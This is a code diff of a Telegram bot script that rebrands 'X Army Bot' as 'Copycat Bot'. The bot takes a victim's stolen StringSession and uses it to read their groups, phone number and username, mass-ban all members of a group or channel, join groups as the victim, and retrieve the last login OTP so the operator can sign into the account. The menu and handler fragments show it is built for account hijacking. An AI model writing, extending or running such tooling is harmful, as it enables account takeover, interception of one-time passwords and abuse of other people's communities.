@@ -152,13 +152,13 @@ menu = '''
 Sub My Fed `1ddafab2-e656-4af9-83fa-43eec33eb5fd`
 
 
-A: [check user own groups and channels]
+A: [CHECK THE USER OWN GROUPS]
 
-B: [check user all information like phone number usrname...]
+B: [ALL INFORMATION ABOUT USER LIKE USERNAME , PHONE NUMBER ETC.....]
 
-C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
+C: [ban a group {GIVE ME GROUP/CHANNEL USERNAME AND STRING SESSION ....I WILL BAN ALL MEMBERS THERE....}]
 
-D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+D: [FOR GETTING LAST OTP {1st use option B take phone number and login there Account then use me i will give you otp}]
 
 E: [Join A Group/Channel via StringSession]
 
@@ -217,12 +217,12 @@ async def start(event):
         return await event.reply("This StringSession is terminated maybe")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY COPYCAT")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await event.reply(i + "\n\nThanks For using Copycat Bot")
     elif res.text == "B":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -232,9 +232,9 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nThanks For using Copycat Bot")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
